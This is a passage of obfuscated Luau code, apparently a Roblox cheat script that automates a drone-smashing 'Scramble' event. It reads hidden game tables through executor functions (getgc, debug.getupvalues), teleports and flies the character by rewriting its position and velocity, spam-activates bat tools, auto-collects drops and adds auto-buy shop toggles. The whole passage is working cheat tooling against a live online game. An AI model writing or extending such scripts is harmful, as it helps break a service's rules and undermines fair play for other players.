fn40("RE/Scramble/Effect", function(arg, arg2, arg3)
if arg ~= "Hit" or type(arg3) ~= "table" or arg3.DroneId == nil then
return
end
local v13 = tbl25[tostring(arg3.DroneId)]
if not v13 then
return
end
v13.Position = fn39(arg2) or v13.Position
v13.Health = (tonumber(v13.Health) or 1) - (tonumber(arg3.Amount) or 1)
if type(arg3.Motion) == "string" and string.find(arg3.Motion, "\"Death\"", 1, true) then
v13.Health = 0
end
if v13.Health <= 0 then
tbl25[v13.Id] = nil
end
end)
fn40("RE/Scramble/Drops", function(arg)
local v13 = pairs
arg = type(arg) == "table" and arg or {}
for _, v14 in v13(arg) do
if type(v14) == "table" and v14.Id ~= nil and fn38(v14) then
local v15 = fn39(v14.Position) or fn39(v14.Origin)
if v15 then
tbl26[tostring(v14.Id)] = {
Position = v15,
Radius = tonumber(v14.Radius) or 6,
ExpiresAt = tonumber(v14.ExpiresAt),
Kind = v14.Kind,
}
end
end
end
end)
fn40("RE/Scramble/State", function(arg)
if type(arg) ~= "table" then
return
end
if arg.Patch == true and type(snapshot) == "table" then
for k, v13 in pairs(arg) do
if k ~= "Patch" then
snapshot[k] = v13
end
end
elseif type(arg.State) == "table" then
snapshot = arg
end
n8 = os.clock()
end)
fn40("RE/Scramble/RemoveDrops", function(arg)
local v13 = pairs
arg = type(arg) == "table" and arg or {}
for k, v14 in v13(arg) do
local v15 = tbl26
local v16 = tostring
v14 = type(v14) == "string" and v14 or k
v15[v16(v14)] = nil
end
end)
local function fn41(arg)
local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
return scrambleLocalVisuals and scrambleLocalVisuals:FindFirstChild("PersonalDrone_" .. arg) or nil
end
local v13 = nil
local n21 = 0
local function fn42()
if v13 and next(v13) ~= nil then
return v13
end
v13 = nil
if os.clock() < n21 or type(getgc) ~= "function" or not fn11() then
return nil
end
n21 = os.clock() + 15
for _, v14 in ipairs(getgc(false)) do
if type(v14) == "function" and islclosure(v14) then
local ok, result = pcall(debug.info, v14, "s")
if ok and type(result) == "string" and string.find(result, "PersonalDrones", 1, true) then
local ok2, result2 = pcall(debug.getupvalues, v14)
if ok2 and type(result2) == "table" then
for _, v15 in pairs(result2) do
if type(v15) ~= "table" then
continue
end
local key, v16 = next(v15)
if type(v16) == "table" and v16.OwnerUserId ~= nil and v16.CFrame ~= nil then
v13 = v15
return v15
end
end
continue
end
end
end
end
return nil
end
local function fn43()
local v14 = fn42()
if not v14 then
return
end
for k, v15 in pairs(v14) do
if type(v15) == "table" and fn38(v15) then
local str4 = tostring(v15.Id or k)
local attributes = type(v15.Attributes) == "table" and v15.Attributes or {}
local tbl36 = tbl25[str4]
local num = tonumber(v15.Health)
if not tbl36 then
tbl36 = { Id = str4, Health = num or 1 }
tbl25[str4] = tbl36
elseif num then
tbl36.Health = math.min(num, tonumber(tbl36.Health) or num)
end
tbl36.Position = fn39(v15.CFrame) or tbl36.Position
tbl36.Tier = tostring(attributes.ScrambleTier or tbl36.Tier or "")
tbl36.Area = tostring(attributes.ScrambleArea or tbl36.Area or "")
if attributes.DroneState == "Death" then
tbl36.Health = 0
end
end
end
for k in pairs(tbl25) do
if v14[k] == nil then
tbl25[k] = nil
end
end
end
fn32 = function()
pcall(fn43)
local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
if not scrambleLocalVisuals then
return
end
for _, child in ipairs(scrambleLocalVisuals:GetChildren()) do
local attribute = child:GetAttribute("ScrambleDroneId")
if child:IsA("Model") and attribute ~= nil and string.sub(child.Name, 1, 14) == "PersonalDrone_" then
local str4 = tostring(attribute)
if child:GetAttribute("DroneState") == "Death" then
tbl25[str4] = nil
elseif not tbl25[str4] then
local ok, result = pcall(child.GetPivot, child)
tbl25[str4] = {
Id = str4,
Position = ok and result.Position or nil,
Health = tonumber(child:GetAttribute("Health")) or 1,
Tier = tostring(child:GetAttribute("ScrambleTier") or ""),
Area = tostring(child:GetAttribute("ScrambleArea") or ""),
Seen = os.clock(),
}
end
end
end
end
local function fn44(arg)
local v14 = fn41(arg.Id)
local hitbox = v14 and v14:FindFirstChild("Hitbox")
if hitbox and hitbox:IsA("BasePart") then
return hitbox.Position
end
if v14 and v14.PrimaryPart then
return v14.PrimaryPart.Position
end
return arg.Position
end
local function fn45()
local tbl36 = {}
local now = os.clock()
for k, v14 in pairs(tbl25) do
local flag4 = v14.Tier == nil or v14.Tier == "" or tbl35[v14.Tier] == true
if flag4 then
flag4 = (tonumber(v14.Health) or 0) > 0
end
local position = flag4 and v14.Position
if position then
position = (tbl32[k] or 0) <= now
end
if position then
tbl36[#tbl36 + 1] = v14
end
end
return tbl36
end
local function fn46()
local v14 = fn15()
if not v14 then
return nil
end
local huge = math.huge
local v15 = nil
for _, v16 in ipairs(fn45()) do
local magnitude = ((fn44(v16) or v16.Position) - v14.Position).Magnitude
local v17 = v12
if v17 == "Rare First" then
if v16.Tier == "AugmentedDrone" then
magnitude -= 200000
elseif v16.Tier == "ReactorDrone" then
magnitude -= 100000
end
elseif v17 == "Most HP First" then
magnitude -= (tonumber(v16.Health) or 0) * 100000
end
if magnitude < huge then
huge = magnitude
v15 = v16
end
end
return v15
end
local function fn47()
local v14 = fn15()
if not v14 then
return nil, nil
end
local serverTimeNow = workspace:GetServerTimeNow()
local huge = math.huge
local v15 = nil
local v16 = nil
for k, v17 in pairs(tbl26) do
if v17.ExpiresAt and v17.ExpiresAt < serverTimeNow then
tbl26[k] = nil
else
local magnitude = (v17.Position - v14.Position).Magnitude
if v17.Kind == "Part" then
magnitude -= 100000
end
if magnitude < huge then
huge = magnitude
v15 = k
v16 = v17
end
end
end
return v15, v16
end
fn33 = function()
if not tbl33.Link then
if tbl33.SwapWait then
tbl33.SwapWait = nil
tbl4.Shield("scramble", false)
end
return
end
tbl33.Link:Disconnect()
local v14 = tbl33
local v15 = tbl33
local v16 = tbl33
tbl33.Link = nil
v14.Goal = nil
v15.Look = nil
v16.Character = nil
local v17 = tbl33
local v18 = tbl33
local v19 = tbl33
local v20 = tbl33
tbl33.Track = nil
v17.Dir = nil
v18.Last = nil
v19.LastAt = nil
v20.Vel = nil
tbl4.Driving = math.max(0, tbl4.Driving - 1)
tbl4.Shield("scramble", false)
end
fn4(fn33)
local function fn48(goal, look, track)
if track ~= tbl33.Track then
local v14 = tbl33
local v15 = tbl33
tbl33.Last = nil
v14.LastAt = nil
v15.Vel = nil
end
local v14 = tbl33
local v15 = tbl33
tbl33.Goal = goal
v14.Look = look
v15.Track = track
local character = localPlayer.Character
if tbl33.Link and tbl33.Character ~= character then
fn33()
local v16 = tbl33
local v17 = tbl33
tbl33.Goal = goal
v16.Look = look
v17.Track = track
end
if tbl33.Link or not character then
return
end
if not tbl4.Swapped() then
tbl4.Shield("scramble", true)
tbl33.SwapWait = tbl33.SwapWait or os.clock() + 6
local swapWait = tbl33.SwapWait
if os.clock() < swapWait then
str2 = "Waiting for the character to settle"
return
end
end
if tbl33.SwapWait then
tbl33.SwapWait = nil
else
tbl4.Shield("scramble", true)
end
tbl33.Character = character
tbl4.Driving = tbl4.Driving + 1
tbl33.Link = RunService.Heartbeat:Connect(function(deltaTime)
local v16 = tbl4.Root()
local goal2 = tbl33.Goal
if not v16 or not goal2 or v16.Parent ~= tbl33.Character or tbl4.AntiGuard.Busy or tbl4.Movement.Owner ~= "scramble" then
return
end
local position = v16.Position
if tbl33.Track then
local ok, last = pcall(tbl33.Track)
if ok and typeof(last) == "Vector3" then
local now = os.clock()
if not tbl33.Last or not tbl33.LastAt then
local v17 = tbl33
tbl33.Last = last
v17.LastAt = now
elseif (last - tbl33.Last).Magnitude > 0.01 then
local n22 = math.max(now - tbl33.LastAt, 0.0041666666666666666)
local n23 = (last - tbl33.Last) / n22
if n23.Magnitude < 400 then
local n24 = math.clamp(n22 * 12, 0.2, 0.8)
tbl33.Vel = tbl33.Vel and tbl33.Vel:Lerp(n23, n24) or n23
end
local v17 = tbl33
tbl33.Last = last
v17.LastAt = now
elseif now - tbl33.LastAt > 0.25 and tbl33.Vel then
tbl33.Vel = tbl33.Vel:Lerp(Vector3.zero, math.clamp(deltaTime * 6, 0, 1))
end
local vel = tbl33.Vel or Vector3.zero
local look2 = tbl33.Last + vel * (math.clamp(now - tbl33.LastAt, 0, 0.25) + 0.1)
local vector = Vector3.new(position.X - look2.X, 0, position.Z - look2.Z)
if vector.Magnitude > 0.5 then
local unit = vector.Unit
local n22 = math.clamp(deltaTime * 5, 0, 1)
local dir = tbl33.Dir and tbl33.Dir:Lerp(unit, n22) or unit
tbl33.Dir = dir.Magnitude > 0.01 and dir.Unit or unit
end
goal2 = look2 + (tbl33.Dir or Vector3.new(0, 0, 1)) * n11 + Vector3.new(0, -1, 0)
local v17 = tbl33
tbl33.Goal = goal2
v17.Look = look2
if (goal2 - position).Magnitude <= 40 then
local n22 = math.max(deltaTime, 0.0041666666666666666)
local n23 = vel + (goal2 - position) / math.max(0.1, n22)
local n24 = math.max(400, vel.Magnitude + 80)
if n24 < n23.Magnitude then
n23 = n23.Unit * n24
end
local assemblyLinearVelocity = n23 + Vector3.new(0, workspace.Gravity * n22 * 0.5, 0)
local vector2 = Vector3.new(look2.X - position.X, 0, look2.Z - position.Z)
pcall(function()
if vector2.Magnitude > 0.05 then
v16.CFrame = CFrame.lookAt(position, position + vector2.Unit)
end
v16.AssemblyLinearVelocity = assemblyLinearVelocity
v16.AssemblyAngularVelocity = Vector3.zero
end)
return
end
end
end
local vector
if not (Vector3.new(goal2.X - position.X, 0, goal2.Z - position.Z).Magnitude > 250) then
vector = goal2
else
local n22 = math.max(n20, goal2.Y)
vector = position.Y < n22 - 2 and Vector3.new(position.X, n22, position.Z) or Vector3.new(goal2.X, n22, goal2.Z)
end
local n22 = vector - position
local n23 = n7 * deltaTime
local n24 = n22.Magnitude <= n23 and vector or position + n22.Unit * n23
goal2 = tbl33.Look or goal2
local vector2 = Vector3.new(goal2.X - n24.X, 0, goal2.Z - n24.Z)
local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v16.CFrame.Rotation
pcall(function()
v16.CFrame = CFrame.new(n24) * cframe
v16.AssemblyLinearVelocity = Vector3.zero
v16.AssemblyAngularVelocity = Vector3.zero
end)
end)
end
local function fn49(arg)
if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
return false
end
local attribute = arg:GetAttribute("GearName")
local gears = tbl.Gears
local directory = type(gears) == "table" and gears.Directory or nil
local flag4 = type(attribute) == "string" and type(directory) == "table" and directory[attribute] or nil
return type(flag4) == "table" and (flag4.ToolController == "Slap" or flag4.SlapPower ~= nil)
end
local function fn50(arg)
if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
return false
end
if tostring(arg:GetAttribute("ItemType")) ~= "Gear" then
return false
end
local str4 = tostring(arg:GetAttribute("GearName") or "")
if str4 == "" then
return false
end
return string.find(string.lower(str4), "scrambler", 1, true) ~= nil
end
local function fn51()
return localPlayer.Character, localPlayer:FindFirstChildOfClass("Backpack")
end
local function fn52()
local v14 = tbl4.FindBat()
if v14 then
return v14
end
local v15, v16 = fn51()
for _, v17 in ipairs({ v15, v16 }) do
if v17 then
for _, child in ipairs(v17:GetChildren()) do
if fn49(child) or fn50(child) then
return child
end
end
end
end
return nil
end
tbl28.Valid = function(arg)
if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
return false
end
return tbl4.IsBatTool(arg) or fn49(arg) or fn50(arg)
end
tbl28.Owned = function(arg)
if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
return false
end
local v14, v15 = fn51()
local parent = arg.Parent
return parent ~= nil and (parent == v14 or parent == v15)
end
tbl28.Name = function(arg)
if fn50(arg) then
return "The Scrambler"
end
return tostring(arg:GetAttribute("GearName") or arg.Name)
end
tbl28.Put = function(arg, arg2, parent)
local equipAt = tbl28.EquipAt
if os.clock() - equipAt < 0.4 then
return false
end
tbl28.EquipAt = os.clock()
pcall(function()
arg2:EquipTool(arg)
end)
if arg.Parent ~= parent then
pcall(function()
arg.Parent = parent
end)
end
return arg.Parent == parent
end
local function fn53()
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
if not character or not humanoid or humanoid.Health <= 0 then
return nil, false
end
local tool = character:FindFirstChildWhichIsA("Tool")
if tool ~= nil and tbl28.Valid(tool) then
tbl28.Tool = tool
str3 = tbl28.Name(tool)
return tool, true
end
if not tbl28.Owned(tbl28.Tool) then
tbl28.Tool = fn52()
end
local tool2 = tbl28.Tool
if not tool2 then
str3 = ""
return nil, false
end
str3 = tbl28.Name(tool2)
tbl28.Put(tool2, humanoid, character)
return tool2, tool2.Parent == character
end
local function fn54()
local v14, v15 = fn53()
if v14 and v15 then
if flag2 then
pcall(function()
v14:Activate()
end)
task.defer(function()
pcall(function()
v14:Deactivate()
end)
end)
else
pcall(function()
v14:Deactivate()
v14:Activate()
end)
end
end
return v14 ~= nil
end
local function fn55()
local v14, v15 = fn51()
local v16 = nil
local v17 = nil
local v18 = nil
for _, v19 in ipairs({ v14, v15 }) do
if v19 then
for _, child in ipairs(v19:GetChildren()) do
if tbl28.Valid(child) then
if fn50(child) then
v16 = v16 or child
elseif tbl4.IsBatTool(child) and (v17 == nil or not tbl4.IsBatTool(v17)) then
if v18 then
v17 = child
else
v18 = v17
v17 = child
end
elseif v17 == nil then
v17 = child
elseif v18 == nil then
v18 = child
end
end
end
end
end
return v17, v16 or v18
end
local function fn56(arg)
pcall(function()
arg:Activate()
end)
task.defer(function()
pcall(function()
arg:Deactivate()
end)
end)
end
tbl29.SpamUntil = 0
tbl29.List = {}
tbl29.Dirty = true
tbl29.BuiltAt = 0
tbl29.NextBag = 0
tbl29.Links = {}
tbl29.Click = function(arg)
pcall(arg.Deactivate, arg)
pcall(arg.Activate, arg)
end
tbl29.Rebuild = function()
tbl29.Dirty = false
tbl29.BuiltAt = os.clock()
table.clear(tbl29.List)
local v14, v15 = fn51()
for _, v16 in ipairs({ v14, v15 }) do
if v16 then
for _, child in ipairs(v16:GetChildren()) do
if tbl28.Valid(child) then
tbl29.List[#tbl29.List + 1] = child
end
end
end
end
end
tbl29.Beat = RunService.Heartbeat:Connect(function()
local now = os.clock()
if tbl29.SpamUntil <= now then
return
end
if tbl29.Dirty or now - tbl29.BuiltAt > 1 then
tbl29.Rebuild()
end
local character = localPlayer.Character
local flag4 = now >= tbl29.NextBag
if flag4 then
tbl29.NextBag = now + 0.25
end
for _, v14 in ipairs(tbl29.List) do
local parent = v14.Parent
if parent == character then
tbl29.Click(v14)
elseif flag4 and parent ~= nil then
tbl29.Click(v14)
end
end
end)
tbl29.Unwatch = function()
for i = #tbl29.Links, 1, -1 do
pcall(function()
tbl29.Links[i]:Disconnect()
end)
tbl29.Links[i] = nil
end
end
tbl29.Watch = function(arg)
tbl29.Unwatch()
tbl29.Dirty = true
if not arg then
return
end
tbl29.Links[#tbl29.Links + 1] = arg.ChildAdded:Connect(function(child)
if not child:IsA("Tool") then
return
end
tbl29.Dirty = true
local spamUntil = tbl29.SpamUntil
if os.clock() < spamUntil and tbl28.Valid(child) then
tbl29.Click(child)
task.defer(tbl29.Click, child)
end
end)
tbl29.Links[#tbl29.Links + 1] = arg.ChildRemoved:Connect(function(child)
if child:IsA("Tool") then
tbl29.Dirty = true
end
end)
task.defer(function()
local backpack = localPlayer:FindFirstChildOfClass("Backpack") or localPlayer:WaitForChild("Backpack", 5)
if backpack and localPlayer.Character == arg then
tbl29.Links[#tbl29.Links + 1] = backpack.ChildAdded:Connect(function()
tbl29.Dirty = true
end)
tbl29.Links[#tbl29.Links + 1] = backpack.ChildRemoved:Connect(function()
tbl29.Dirty = true
end)
end
end)
end
tbl29.Watch(localPlayer.Character)
tbl29.CharLink = localPlayer.CharacterAdded:Connect(tbl29.Watch)
fn4(function()
tbl29.SpamUntil = 0
tbl29.Unwatch()
for _, v14 in ipairs({ "Beat", "CharLink" }) do
if tbl29[v14] then
pcall(function()
tbl29[v14]:Disconnect()
end)
tbl29[v14] = nil
end
end
end)
local function fn57()
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
if not character or not humanoid or humanoid.Health <= 0 then
return false
end
local v14, v15 = fn55()
if not v14 or not v15 then
return fn54()
end
local tbl36 = { v14, v15 }
local tbl37 = { 0.3, 0.4 }
local v16 = tbl36[tbl29.Index]
if tbl29.Tool ~= v16 then
local v17 = tbl29
local v18 = tbl29
local now = os.clock()
v17.Tool = v16
v18.Since = now
end
local flag4 = v16.Parent == character
if flag4 then
local since = tbl29.Since
flag4 = os.clock() - since >= tbl37[tbl29.Index]
end
if flag4 then
tbl29.Index = tbl29.Index == 1 and 2 or 1
v16 = tbl36[tbl29.Index]
local v17 = tbl29
local v18 = tbl29
local now = os.clock()
v17.Tool = v16
v18.Since = now
end
tbl28.Tool = v16
str3 = tbl28.Name(v16)
if v16.Parent ~= character then
pcall(function()
humanoid:EquipTool(v16)
end)
if v16.Parent ~= character then
pcall(function()
v16.Parent = character
end)
end
tbl29.Since = os.clock()
if v16.Parent == character then
fn56(v16)
task.defer(fn56, v16)
end
return true
end
fn56(v16)
return true
end
local function fn58(arg, arg2, arg3)
local now = os.clock()
local n22 = now + n15
while os.clock() < n22 and not arg() do
local v14, v15 = fn47()
local flag4 = not v15
if not flag4 then
if arg2 then
flag4 = (v15.Position - arg2).Magnitude > (arg3 or 40)
else
flag4 = arg2
end
end
if flag4 then
if arg2 and os.clock() - now < 1.2 then
task.wait(0.1)
continue
end
return
end
if fn21() and not fn21(v15.Position) then
fn33()
str2 = "Leaving the base through the safe zone"
if not fn24(v15.Position + Vector3.new(0, 2.5, 0), arg, 6) then
return
end
continue
end
str2 = v15.Kind == "Part" and "Picking up a Drone Part" or "Picking up Samples"
fn48(v15.Position + Vector3.new(0, 2.5, 0), v15.Position)
local n23 = os.clock() + 2.5
while tbl26[v14] and os.clock() < n23 and not arg() do
task.wait(0.1)
end
tbl26[v14] = nil
n22 = os.clock() + 1.2
end
end
local function fn59(arg, arg2)
local now = os.clock()
local n22 = tonumber(arg.Health) or 0
local v14 = nil
local now2 = nil
local fn60 = nil
local flag4 = false
while not arg2() do
local v15 = tbl25[arg.Id]
local flag5 = not v15
if not flag5 then
flag5 = (tonumber(v15.Health) or 0) <= 0
end
if flag5 then
return true
end
local v16 = fn41(arg.Id)
if v16 and v16:GetAttribute("DroneState") == "Death" then
tbl25[arg.Id] = nil
return true
end
local v17 = fn15()
local flag6 = v17 ~= nil and v15.Position ~= nil
if flag6 then
flag6 = (v17.Position - (fn44(v15) or v15.Position)).Magnitude <= 30
end
if flag6 and not v16 then
local now3 = v14 or os.clock()
if os.clock() - now3 > 1.5 then
tbl25[arg.Id] = nil
return false
end
v14 = now3
else
v14 = nil
end
local n23 = tonumber(v15.Health) or 0
if n23 ~= n22 then
now2 = nil
n22 = n23
end
if n14 < os.clock() - now then
tbl32[arg.Id] = os.clock() + 30
return false
end
local position = fn44(v15) or v15.Position
local v18 = fn15()
if not v18 then
return false
end
if fn21() and not fn21(position) then
fn33()
str2 = "Leaving the base through the safe zone"
if not fn24(position, arg2, 12) then
return false
end
if arg2() then
return false
end
end
if not fn60 then
local v19 = nil
local isBasePart = nil
fn60 = function()
local v20 = tbl25[arg.Id]
if not v20 then
return nil
end
if not v19 or not v19.Parent then
v19 = fn41(arg.Id)
local hitbox = v19 and v19:FindFirstChild("Hitbox")
isBasePart = hitbox and hitbox:IsA("BasePart") and hitbox or v19 and v19.PrimaryPart or nil
end
if isBasePart and isBasePart.Parent then
return isBasePart.Position
end
return v20.Position
end
end
if flag2 then
fn48(position + Vector3.new(0, -1, 16), position, fn60)
else
fn48(position + Vector3.new(0, -1, 5), position)
end
if (v18.Position - position).Magnitude <= 60 and not flag2 then
fn53()
end
local magnitude = (v18.Position - position).Magnitude
local flag7 = false
if flag2 then
flag7 = math.max(12, n11 + 7)
end
local flag8 = magnitude <= (flag7 or 12)
if flag8 then
if flag2 then
tbl29.SpamUntil = os.clock() + 0.2
end
now2 = now2 or os.clock()
if os.clock() - now2 > 8 then
tbl32[arg.Id] = os.clock() + 30
return false
end
local flag9 = false
if flag2 then
flag9 = fn57()
end
if flag9 or not flag2 and fn54() then
str2 = string.format("Smashing %s  %d HP", v15.Tier ~= "" and v15.Tier or "drone", math.max(0, tonumber(v15.Health) or 0))
elseif not flag4 then
str2 = "No bat found, get any bat to smash drones"
flag4 = true
end
else
str2 = "Flying to a drone"
end
local wait = task.wait
local flag9 = false
if not flag2 then
flag8 = flag9
end
wait(flag8 and 0.03 or 0.1)
end
return false
end
local function fn60(arg)
for _, v14 in ipairs(tbl31) do
if arg() then
return false
end
str2 = "Looking for drones"
fn48(v14)
local n22 = os.clock() + 12
while os.clock() < n22 and not arg() do
fn32()
if #fn45() > 0 then
return true
end
if tbl4.DistanceTo(v14) < 8 then
break
end
task.wait(0.2)
end
end
return #fn45() > 0
end
local function fn61()
local serverTimeNow = workspace:GetServerTimeNow()
local v14, v15 = fn11()
if v14 and v15 and v15 < 25 then
return next(tbl26) ~= nil
end
for _, v16 in pairs(tbl26) do
local flag4 = v16.Kind == "Part"
local flag5
if flag4 then
flag5 = flag4
else
flag5 = v16.ExpiresAt and v16.ExpiresAt - serverTimeNow < 30
end
if flag5 then
return true
end
end
return false
end
local v14 = nil
local function fn62()
local window = type(snapshot) == "table" and snapshot.Window or nil
return type(window) == "table" and window.Index or nil
end
local function fn63(arg)
local flag4 = v14 ~= nil and v14 == fn62()
while not arg() do
RunService.Heartbeat:Wait()
if not arg() then
fn32()
if fn61() then
fn58(arg)
end
local v15, flag5, flag6, v16, flag7, position, flag8, magnitude, flag9, flag10, flag11, vector, flag12, n22, n23, v17, n24, flag13, flag14, flag15
if fn21() then
fn33()
if fn23(arg) then
v15 = fn46()
flag5 = not v15 and next(tbl26) ~= nil
if flag5 then
fn58(arg)
fn32()
v15 = fn46()
end
if not v15 then
flag6 = not fn11()
v16 = flag6 or flag4
if not v16 then
v14 = fn62()
flag7 = true
flag4 = true
if not fn60(arg) then
break
else
continue
end
end
else
position = fn44(v15) or v15.Position
flag8 = fn15()
magnitude = flag8 and (flag8.Position - position).Magnitude or 0
flag9 = v10 == "Teleport"
flag8 = flag9 and flag8
if flag8 then
flag10 = fn21() and not fn21(position)
flag8 = not flag10
end
if flag8 then
flag11 = magnitude > n13 and magnitude <= n16 and os.clock() >= n18 and os.clock() - n19 >= n17
if flag11 then
n19 = os.clock()
vector = Vector3.new
flag12 = false
if flag2 then
flag12 = 16
end
n22 = flag12 or 5
n23 = position + vector(0, -1, n22)
fn48(n23, position)
v17 = fn15()
if v17 then
str2 = "Teleporting to the next drone"
pcall(function()
v17.CFrame = CFrame.lookAt(n23, Vector3.new(position.X, n23.Y, position.Z))
v17.AssemblyLinearVelocity = Vector3.zero
v17.AssemblyAngularVelocity = Vector3.zero
end)
n24 = os.clock() + 0.8
while true do
flag13 = os.clock() < n24
flag14 = flag13 and not arg()
if flag14 then
flag15 = fn15()
flag15 = flag15 and (flag15.Position - n23).Magnitude > 40
if flag15 then
n18 = os.clock() + 30
str2 = "Teleport pulled back, tweening"
break
else
RunService.Heartbeat:Wait()
continue
end
end
break
end
end
end
end
fn59(v15, arg)
continue
end
end
else
v15 = fn46()
flag5 = not v15 and next(tbl26) ~= nil
if flag5 then
fn58(arg)
fn32()
v15 = fn46()
end
if not v15 then
flag6 = not fn11()
v16 = flag6 or flag4
if not v16 then
v14 = fn62()
flag7 = true
flag4 = true
if not fn60(arg) then
break
else
continue
end
end
else
position = fn44(v15) or v15.Position
flag8 = fn15()
magnitude = flag8 and (flag8.Position - position).Magnitude or 0
flag9 = v10 == "Teleport"
flag8 = flag9 and flag8
if flag8 then
flag10 = fn21() and not fn21(position)
flag8 = not flag10
end
if flag8 then
flag11 = magnitude > n13 and magnitude <= n16 and os.clock() >= n18 and os.clock() - n19 >= n17
if flag11 then
n19 = os.clock()
vector = Vector3.new
flag12 = false
if flag2 then
flag12 = 16
end
n22 = flag12 or 5
n23 = position + vector(0, -1, n22)
fn48(n23, position)
v17 = fn15()
if v17 then
str2 = "Teleporting to the next drone"
pcall(function()
v17.CFrame = CFrame.lookAt(n23, Vector3.new(position.X, n23.Y, position.Z))
v17.AssemblyLinearVelocity = Vector3.zero
v17.AssemblyAngularVelocity = Vector3.zero
end)
n24 = os.clock() + 0.8
while true do
flag13 = os.clock() < n24
flag14 = flag13 and not arg()
if flag14 then
flag15 = fn15()
flag15 = flag15 and (flag15.Position - n23).Magnitude > 40
if flag15 then
n18 = os.clock() + 30
str2 = "Teleport pulled back, tweening"
break
else
RunService.Heartbeat:Wait()
continue
end
end
break
end
end
end
end
fn59(v15, arg)
continue
end
end
end
break
end
fn58(arg)
fn33()
end
local tbl36 = { LostPart1 = "Mechanical Gear", LostPart2 = "Wiring Harness" }
tbl4.ScrambleLostPart = function(arg)
return fn12(fn9(), arg)
end
v11 = nil
fn34 = function()
local v15 = fn9()
if not v15 then
return "Lost Parts: no event data"
end
local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
local tbl37 = {}
local n22 = 0
local n23 = 0
for _, v16 in ipairs(tbl22) do
local v17 = drScrambleEvent and drScrambleEvent:FindFirstChild(v16)
if v17 then
n22 += 1
end
if fn12(v15, v16) then
n23 += 1
elseif v17 then
local ok, result = pcall(v17.GetPivot, v17)
local v18 = ok and tbl4.DistanceTo(result.Position) or nil
tbl37[#tbl37 + 1] = v18 and string.format("%s %d studs", tbl36[v16], math.floor(v18)) or tbl36[v16]
else
tbl37[#tbl37 + 1] = tbl36[v16] .. " not on map"
end
end
local str4 = string.format("Lost Parts on map %d/2  -  Collected %d/2", n22, n23)
if #tbl37 > 0 then
str4 ..= "  -  " .. table.concat(tbl37, "  -  ")
end
return str4
end
local function fn64(arg)
if not fn20() then
return true
end
local Exit = fn18("Exit")
local v15 = fn19(Exit, nil)
if not v15 then
return false
end
str2 = "Leaving the Secret Cave"
if not fn16(v15, arg, 4) then
return false
end
for i = 1, 4 do
if arg() then
return false
end
fn17(Exit or fn18("Exit"))
local n22 = os.clock() + 1.5
while os.clock() < n22 and fn20() do
RunService.Heartbeat:Wait()
end
if not fn20() then
return true
end
end
return not fn20()
end
local function fn65()
return tbl4.IsNight() or tbl4.WallSealed()
end
local function fn66(arg)
if not fn65() then
return true
end
fn33()
while fn65() and not arg() do
str2 = tbl4.IsNight() and "Night, waiting for the wall to drop" or "Waiting for the wall to drop"
RunService.Heartbeat:Wait()
end
return not arg()
end
fn35 = function()
if not tbl4.Toggle(nil, false) or not fn10() then
return false
end
if tbl30.Ended then
return false
end
if fn11() then
return true
end
fn32()
return #fn45() > 0 or next(tbl26) ~= nil
end
fn36 = function()
local v15 = fn9()
if not v15 or v15.Completed == true or not fn10() then
return false
end
local num = tonumber(v15.TotalParts)
if not num then
num = fn13(v15) + (tonumber(v15.DroneParts) or 0)
end
local flag4 = tbl4.Toggle(nil, false)
if flag4 then
local n22 = #tbl22
flag4 = fn13(v15) < n22
end
local flag5 = tbl4.Toggle(nil, false) and (num >= 5 or v15.Discovered ~= true)
return flag4 or flag5
end
fn37 = function(arg)
local function fn67()
return arg ~= n9 or tbl4.Movement.Owner ~= "scramble"
end
local function fn68()
return fn67() or not fn35() or fn65()
end
while true do
if fn35() and not fn67() then
if fn66(fn67) then
pcall(fn63, fn68)
if fn65() then
continue
end
end
end
break
end
fn33()
if fn67() or fn35() then
return
end
if not fn36() then
fn25(fn67)
str2 = ""
return
end
if not fn66(fn67) then
return
end
scrambleRead(true)
local v15 = fn9()
if not v15 then
return
end
if not fn36() then
str2 = ""
return
end
if tbl4.Toggle(nil, false) and v15.Discovered ~= true then
pcall(fn26, fn67)
end
if tbl4.Toggle(nil, false) then
pcall(fn27, function()
return fn67() or not tbl4.Toggle(nil, false) or fn35() or fn65()
end)
end
if tbl4.Toggle(nil, false) then
pcall(fn28, function()
return fn67() or not tbl4.Toggle(nil, false) or fn35() or fn65()
end)
end
if fn20() and not fn67() then
pcall(fn64, fn67)
end
if not fn20() and not fn35() then
pcall(fn25, fn67)
end
end
end
local fn38
fn38 = function(arg)
if not (tbl4.Treadmill.Riding or tbl4.OnBelt()) then
return true
end
for i = 1, 3 do
if arg() then
return false
end
str2 = "Jumping off the treadmill"
tbl4.Treadmill.Riding = false
task.spawn(tbl4.LeaveBelt)
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
pcall(function()
humanoid.Sit = false
humanoid.Jump = true
humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end)
end
local v12 = fn15()
if v12 then
local position = v12.Position
local n20 = position + Vector3.new(0, 18, 0)
local now = os.clock()
while true do
RunService.Heartbeat:Wait()
local v13 = fn15()
if not v13 then
break
else
local n21 = math.min(1, (os.clock() - now) / 0.25)
pcall(function()
local rotation = v13.CFrame.Rotation
v13.CFrame = CFrame.new(position:Lerp(n20, n21)) * rotation
v13.AssemblyLinearVelocity = Vector3.zero
v13.AssemblyAngularVelocity = Vector3.zero
end)
if not (n21 >= 1) then
continue
end
break
end
end
end
if not (tbl4.Treadmill.Riding or tbl4.OnBelt()) then
return true
end
end
return not tbl4.OnBelt()
end
tbl27.Handle = v7:CreateToggle({
Name = "Auto Buy Scramble Shop",
Note = "Buy the picked items with Samples",
Default = false,
Callback = function()
n12 = 0
tbl3.Wake()
end,
})
fn6(v7:CreateMultiDropdown({
Name = "Scramble Shop Items",
Options = tbl24,
Default = { "Scrambled Mutation" },
SubOf = tbl27.Handle,
Callback = function(arg)
local picked = {}
if type(arg) == "table" then
for k, v12 in pairs(arg) do
if v12 == true and type(k) == "string" then
picked[k] = true
